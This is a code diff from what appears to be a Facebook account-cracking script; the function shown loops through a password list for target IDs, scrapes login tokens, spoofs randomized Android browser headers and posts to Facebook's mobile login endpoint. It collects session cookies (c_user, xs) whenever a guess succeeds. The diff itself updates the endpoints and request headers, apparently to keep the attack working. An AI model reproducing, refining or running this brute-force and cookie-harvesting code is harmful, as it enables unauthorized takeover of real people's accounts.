@@ -1204,7 +1204,7 @@ def m3(ids,pwv):
     ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
     try:
         for pas in pwv:
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://m.facebook.com').text
             info={
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1222,24 +1222,33 @@ def m3(ids,pwv):
             'had_cp_prefilled': 'true',
             'had_password_prefilled': 'false',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
-            update={
-            'authority': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/?tbua=1',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
-            'referer': 'https://m.facebook.com/',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            update= {
+            'Host': 'm.facebook.com',
+            'content-length': '1730',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
             'sec-ch-ua-mobile': '?1',
+            'user-agent': ua3,
+            'x-response-format': 'JSONStream',
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-lsd': 'AVo_Z7twFKE',
+            'viewport-width': '360',
+            'sec-ch-ua-platform-version': '""',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-asbd-id': '129477',
+            'dpr': '2',
+            'sec-ch-ua-full-version-list': '',
+            'sec-ch-ua-model': '""',
+            'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
+            'accept': '*/*',
+            'origin': 'https://m.facebook.com',
             'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; U; Android 9;  en-us; GT-J768I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4471.60 Mobile Safari/537.36'}
-            session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=info,headers=update).text
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://m.facebook.com/',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
+            session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
